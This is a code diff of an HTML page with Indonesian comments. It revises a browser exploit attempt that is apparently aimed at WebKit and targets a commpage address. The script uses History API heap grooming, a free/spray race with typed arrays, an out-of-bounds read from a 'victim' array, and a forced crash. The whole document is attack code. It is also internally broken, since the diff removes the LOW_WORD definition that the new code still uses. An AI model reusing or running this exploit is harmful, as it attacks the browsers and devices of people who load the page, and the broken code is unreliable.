@@ -1,27 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>History API State Corruption Attack</title>
+    <title>History API State Corruption V2 (Length Confusion)</title>
 </head>
 <body>
 
-    <h1>History API State Corruption (Commpage Target)</h1>
+    <h1>History API State Corruption V2 (Length Confusion)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Serangan History API...</p>
+    <p id="status">INIT: Mempersiapkan Serangan History API V2...</p>
     <div id="log-area"></div>
 
     <script>
         // --- KONSTANTA COMM PAGE ---
         const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
         const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
-        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
-        
-        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
-        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
+        // Kita hanya akan menargetkan LOW_WORD (32-bit) untuk menimpa Length
+        const TARGET_LENGTH_VALUE = LOW_WORD; 
 
         let startTime = performance.now();
         let payloadHolders = []; 
-        let historyStates = []; // Menyimpan referensi state
+        let victimArray = null; 
 
         function log(message, type = 'log-info') {
             const timeElapsed = (performance.now() - startTime).toFixed(2);
@@ -30,17 +28,18 @@
             logElement.scrollTop = logElement.scrollHeight;
         }
 
-        // --- FUNGSI HEAP SPRAY PAYLOAD ---
+        // --- FUNGSI HEAP SPRAY PAYLOAD (Target Length) ---
         function sprayPayload() {
-            log("Memulai Spraying Payload...", "log-spray");
+            log("Memulai Spraying Payload (Targeting Length)...", "log-spray");
             const SPRAY_COUNT = 1500;
-            const PAYLOAD_SIZE = 64; 
+            // Gunakan TypedArray yang memiliki ukuran 32-bit (untuk menimpa length)
+            const PAYLOAD_SIZE = 1000; 
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
-                let payloadArray = new Float64Array(PAYLOAD_SIZE);
-                payloadArray[0] = HIGH_WORD; 
-                payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 2031.0 + i; 
+                let payloadArray = new Uint32Array(PAYLOAD_SIZE);
+                // Tempatkan LOW_WORD (Commpage Address) di lokasi yang strategis
+                payloadArray[3] = TARGET_LENGTH_VALUE; // Lokasi target length/type
+                payloadArray[4] = 0x41414141; 
                 payloadHolders.push(payloadArray); 
             }
         }
@@ -48,66 +47,66 @@
         // --- FUNGSI UTAMA ATTACK ---
         function runHistoryAttack() {
             startTime = performance.now();
-            log("Phase 1: Melakukan Heap Grooming dengan History State.", "log-init");
+            log("Phase 1: History Grooming & Victim Array Setup.", "log-init");
 
             const HISTORY_COUNT = 100;
-            const STATE_ARRAY_SIZE = 1024 * 1024; // State 4MB (cukup besar untuk fragmentasi heap)
+            const STATE_ARRAY_SIZE = 1024 * 10; // Ukuran kecil untuk Type Confusion
             
-            // 1. Fragmentasi Heap dengan History State
+            // 1. Grooming dengan History State
             for (let i = 0; i < HISTORY_COUNT; i++) {
-                let stateArray = new Uint32Array(STATE_ARRAY_SIZE);
-                // Isi array dengan nilai yang unik
-                stateArray.fill(0xFEEDFACE + i);
-                
-                // Gunakan pushState untuk menyimpan objek yang besar dan kompleks
-                // Ini memaksa serialization dan alokasi memori C++ di History Cache
+                let stateArray = new Int32Array(STATE_ARRAY_SIZE);
                 window.history.pushState({ id: i, data: stateArray }, `State ${i}`, `#step${i}`);
-                historyStates.push(stateArray);
             }
-            log(`Phase 2: ${HISTORY_COUNT} History State Besar diserialisasi.`, "log-info");
-
-            // 2. Memicu Corrupt State
-            // Kita coba kembali ke state yang sangat tua, berharap memuat ulang objek yang sudah fragmentasi
-            window.history.go(-HISTORY_COUNT + 1);
-            log("Phase 3: Navigasi cepat ke History State awal.", "log-critical");
+            log(`Phase 2: ${HISTORY_COUNT} History State dibuat.`, "log-info");
+            
+            // 2. Alokasi Array Korban di Heap yang sama dengan History State
+            victimArray = new Int32Array(STATE_ARRAY_SIZE);
+            victimArray.fill(0xBBBBBBBB); // Pola unik
 
             // 3. FREE/SPRAY Race
-            // Kita segera membersihkan referensi JavaScript dan melakukan spray
-            // Ini menciptakan UAF di History Cache C++
             setTimeout(() => {
-                log("Phase 4: Memicu FREE/SPRAY...", "log-critical");
+                log("Phase 3: Navigasi Cepat & Memicu FREE...", "log-critical");
                 
-                // Hapus semua referensi JS (memaksa GC)
-                historyStates = null;
+                // Kembali ke state paling awal (memaksa WebKit me-free state yang tidak terpakai)
+                window.history.go(-HISTORY_COUNT);
                 
-                // Lakukan Spray Payload
+                // Lakukan Spray Payload (Menimpa Length/Header)
                 sprayPayload(); 
                 
-                // 4. Trigger Eksploitasi: Memicu Pemanggilan State Corrupt
-                // Coba navigasi cepat lagi. WebKit harus membaca objek state yang sudah ditimpa
+                // 4. Trigger Eksploitasi: Akses Array Korban
+                // Kita berharap salah satu alokasi spray menimpa length/header victimArray
                 
-                // Menggunakan pushState lagi setelah spray akan mencoba menulis ke lokasi yang sama.
-                let attackerState = new Float64Array(1024); // Array kecil untuk pemicu
-                attackerState.fill(HIGH_WORD);
-                window.history.pushState({ trigger: attackerState }, 'Attack', '#attack');
+                try {
+                    log(`Mengecek length victimArray: ${victimArray.length}`, "log-critical");
+                    
+                    // Coba akses memori Out-of-Bounds (OOB) yang sekarang mungkin di luar batas
+                    const OOB_INDEX = victimArray.length + 500; 
+                    
+                    // Jika length ditimpa, akses ini akan meluas ke area memori yang dispray
+                    const crashValue = victimArray[OOB_INDEX];
+                    
+                    log(`Nilai OOB dibaca: 0x${crashValue.toString(16)}`, "log-critical");
 
-                log("Phase 5: Navigasi/pushState Attacker. Menunggu Crash Implisit.", "log-critical");
-            }, 100); 
-            
-            // Trigger alternatif: Memicu GC agresif untuk membersihkan History Cache
-            setTimeout(() => {
-                // Tidak ada cara langsung, jadi kita alokasikan banyak memori lagi
-                for(let i = 0; i < 50; i++) {
-                    new Array(1024 * 1024 * 5).fill(0xDEADBEEF); // 5MB x 50 = 250MB filler
+                    // Jika crashValue sama dengan Commpage Address (LOW_WORD)
+                    if (crashValue === TARGET_LENGTH_VALUE) {
+                        log("SUCCESS: Length Corruption dan Commpage Address Ditemukan!", "log-success");
+                    }
+                    
+                    // Trigger Final (memaksa crash di JIT)
+                    let finalArray = new Array(crashValue); // Jika crashValue adalah alamat, crash di alokasi
+                    finalArray.fill(0);
+
+                } catch(e) {
+                     log(`JS Exception: ${e.message} - Menunggu Crash OS.`, "log-critical");
                 }
-                log("Trigger GC Implisit selesai.", "log-info");
-            }, 200);
+
+            }, 50); 
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian History API Attack...';
+            document.getElementById('status').textContent = 'Memulai rangkaian History API V2...';
             setTimeout(runHistoryAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah State Corruption.';
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Length Corruption.';
         });
     </script>
     <style>
